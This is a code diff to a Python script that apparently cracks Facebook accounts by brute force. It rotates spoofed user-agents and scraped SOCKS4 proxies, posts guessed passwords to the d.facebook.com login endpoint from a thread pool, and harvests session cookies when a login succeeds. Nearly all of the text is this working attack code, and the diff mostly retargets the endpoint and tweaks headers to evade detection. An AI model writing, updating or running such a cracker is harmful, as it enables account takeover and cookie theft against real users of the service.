@@ -24,33 +24,22 @@ cokbrut=[]
 ses=requests.Session()
 ugen=[]
 uas=[]
-for ua in range(5000):
-      a='Mozilla/5.0 (Linux; Android'
-      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
-      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
-      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
-      d=random.randrange(40,115)
-      e='0'
-      f=random.randrange(3000,6000)
-      g=random.randrange(20,100)
-      h='Mobile Safari/537.36'
-      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
-      ugen.append(ug)
-for ua in range(5000):
-    a='NokiaX'
-    b=random.randrange(1,9)
-    c='-0'
-    d=random.randrange(1,9)
-    e='/'
-    f=random.randrange(1,9)
-    g='.0 ('
-    h=random.randrange(1,12)
-    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
-    j='UNTRUSTED/'
-    k=random.randrange(1,3)
-    l='.0'
-    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
+try:
+ prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
+ open('.prox.txt','w').write(prox)
+except Exception as e:
+ print('')
+ proxy=open('.prox.txt','r').read().splitlines()
+for xd in range(10000):
+    a='Nokia'
+    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    c=random.randrange(1, 99)
+    d='/GoBrowser/'
+    e='1.6.0.'
+    f=random.randrange(1, 99)
+    uaku2=(f'{a}{b}{c}{d}{e}{f}')
     ugen.append(uaku2)
+    
 logo=("""
 \x1b[1;90m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┑
 \x1b[1;90m┃  \033[1;91m88""Yb 8888b.  Yb  dP    \x1b[1;90m 
@@ -92,7 +81,7 @@ def fuck():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(4))
         user.append(nmp)
-    with ThreadPool(max_workers=100) as turag:
+    with ThreadPool(max_workers=50) as turag:
         os.system('clear')
         print(logo)
         tl = str(len(user))
@@ -120,7 +109,7 @@ def rcrack(uid,pwx,tl):
             bi = random.choice([A,B,C,D,E,F,G,H])
             sys.stdout.write(f'\r \033[1;31m[%sRDX\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
             sys.stdout.flush()
-            free_fb = session.get('https://free.facebook.com').text
+            free_fb = session.get('https://d.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -132,30 +121,29 @@ def rcrack(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_freefb = {
-            'authority': 'mbasic.facebook.com',
-    'method': 'GET',
+    'authority': 'd.facebook.com',
+    'lmethod': 'GET',
     'scheme': 'https', 
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
+    'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
     'cache-control': 'max-age=0',
-    # 'cookie': 'datr=0XYzZatzTm0OBvRuPOinVUmi; sb=0XYzZd0V1quGiKWw8h-4930G',
-    'dpr': '1.7937500476837158',
+    'dpr': '0.9',
     'sec-ch-prefers-color-scheme': 'dark',
-    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"Primo H9 Pro"',
-    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
+    'sec-ch-ua-full-version-list': '"Chromium";v="118.0.5993.89", "Google Chrome";v="118.0.5993.89", "Not=A?Brand";v="99.0.0.0"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-model': '""',
+    'sec-ch-ua-platform': '"Windows"',
     'sec-ch-ua-platform-version': '"10.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'cross-site',
+    'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
     'user-agent': pro,
-    'viewport-width': '980',
+    'viewport-width': '901',
 }
-            lo = session.post('https://free.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+            lo = session.post('https://d.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
